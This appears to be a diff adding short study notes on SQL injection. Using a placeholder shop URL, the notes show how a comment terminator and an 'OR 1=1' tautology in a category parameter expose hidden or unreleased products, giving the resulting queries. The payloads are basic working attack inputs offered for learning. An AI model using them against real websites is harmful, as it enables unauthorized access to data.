@@ -1,0 +1,23 @@
+1. Retrieving hidden data
+
+Going to a website that has a categories may have a url like:
+https://www.website.com/products?category=Category1
+
+The SQL statement behind the scenes may look something like this:
+SELECT * FROM products WHERE category = 'Category1' AND available = 1
+
+You can try and constructing a URL like: 
+https://www.website.com/products?category=Category1'--
+
+This results in a SQL statement behind the scenes that looks like:
+SELECT * FROM products WHERE category = 'Category1'--' AND available = 1
+
+RESULT: This would show all the products from a certain category, not just ones available to the public.
+
+If there are hidden categories, you can try and constructing a URL like:
+https://www.website.com/products?category=Category1'+OR+1=1--
+
+This results in a SQL statement behind the scenes that looks like:
+SELECT * FROM products WHERE category = 'Category1' OR 1=1-- AND available = 1
+
+RESULT: This would show all products no matter what category or availability because logically 1 always equals 1.
